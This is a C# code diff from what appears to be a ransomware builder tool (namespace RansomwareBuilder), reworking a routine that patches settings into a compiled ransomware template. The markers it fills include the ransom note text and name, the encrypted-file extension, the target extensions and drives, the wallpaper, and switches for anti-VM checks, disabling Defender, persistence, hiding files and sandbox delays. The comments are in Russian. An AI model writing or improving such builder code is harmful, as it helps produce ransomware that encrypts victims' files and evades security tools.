@@ -769,29 +769,28 @@ namespace RansomwareBuilder
         private void PatchBinary(byte[] data, string marker, string value)
 {
     // ============================================================
-    // ИСПОЛЬЗУЕМ ASCII (ОДНОБАЙТОВАЯ КОДИРОВКА)
+    // ПРЯМОЙ ПОИСК МАРКЕРА ПО БАЙТАМ
     // ============================================================
-    byte[] markerBytes = Encoding.ASCII.GetBytes(marker);
-    byte[] valueBytes = Encoding.ASCII.GetBytes(value + "\0");
+    byte[] markerBytes = new byte[marker.Length];
+    for (int i = 0; i < marker.Length; i++)
+        markerBytes[i] = (byte)marker[i];
+    
+    byte[] valueBytes = new byte[value.Length + 1];
+    for (int i = 0; i < value.Length; i++)
+        valueBytes[i] = (byte)value[i];
+    valueBytes[value.Length] = 0; // нуль-терминатор
     
     // ============================================================
-    // ЖЕСТКИЕ РАЗМЕРЫ БУФЕРОВ (из template.cpp)
+    // ЖЕСТКИЕ РАЗМЕРЫ БУФЕРОВ
     // ============================================================
     int maxLen = 256;
     if (marker.Contains("WALLPAPER_BASE64")) maxLen = 16384;
     else if (marker.Contains("NOTE_CONTENT")) maxLen = 4096;
     else if (marker.Contains("EXTS")) maxLen = 2048;
-    else if (marker.Contains("EXCLUDE") || marker.Contains("INCLUDE")) maxLen = 1024;
     else if (marker.Contains("DRIVES")) maxLen = 512;
     else if (marker.Contains("NOTE_NAME") || marker.Contains("FAKE_NAME")) maxLen = 64;
     else if (marker.Contains("ENC_EXT") || marker.Contains("WALLPAPER_EXT")) maxLen = 32;
-    else if (marker.Contains("ALGO") || marker.Contains("ENABLED") || 
-             marker.Contains("ANTI_VM") || marker.Contains("DEFENDER") ||
-             marker.Contains("PERSISTENCE") || marker.Contains("HIDE_FILES") ||
-             marker.Contains("SANDBOX_DELAY") || marker.Contains("DELAY"))
-    {
-        maxLen = 8;
-    }
+    else maxLen = 8;
     
     for (int i = 0; i < data.Length - markerBytes.Length; i++)
     {
@@ -803,7 +802,6 @@ namespace RansomwareBuilder
         if (found)
         {
             int start = i + markerBytes.Length;
-            
             int copyLen = Math.Min(valueBytes.Length, maxLen);
             Array.Copy(valueBytes, 0, data, start, copyLen);
             
